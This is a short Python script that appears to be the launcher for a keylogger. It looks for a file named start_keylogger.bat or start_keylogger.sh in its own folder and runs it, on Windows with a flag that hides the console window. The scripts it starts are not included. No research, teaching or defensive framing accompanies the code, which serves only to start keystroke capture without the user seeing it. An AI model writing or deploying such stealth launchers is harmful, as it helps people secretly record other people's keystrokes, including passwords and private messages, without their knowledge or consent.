import os
import subprocess
import platform

def run_hidden():
    base_dir = os.path.dirname(os.path.abspath(__file__))

    if platform.system() == "Windows":
        bat_file = os.path.join(base_dir, "start_keylogger.bat")
        if not os.path.exists(bat_file):
            raise FileNotFoundError("start_keylogger.bat not found!")
        subprocess.Popen(
            ["cmd", "/c", bat_file],
            creationflags=subprocess.CREATE_NO_WINDOW
        )

    elif platform.system() in ["Linux", "Darwin"]:
        sh_file = os.path.join(base_dir, "start_keylogger.sh")
        if not os.path.exists(sh_file):
            raise FileNotFoundError("start_keylogger.sh not found!")
        os.chmod(sh_file, 0o755)
        subprocess.Popen(["bash", sh_file])

    else:
        raise OSError(f"Unsupported OS: {platform.system()}")

if __name__ == "__main__":
    run_hidden()
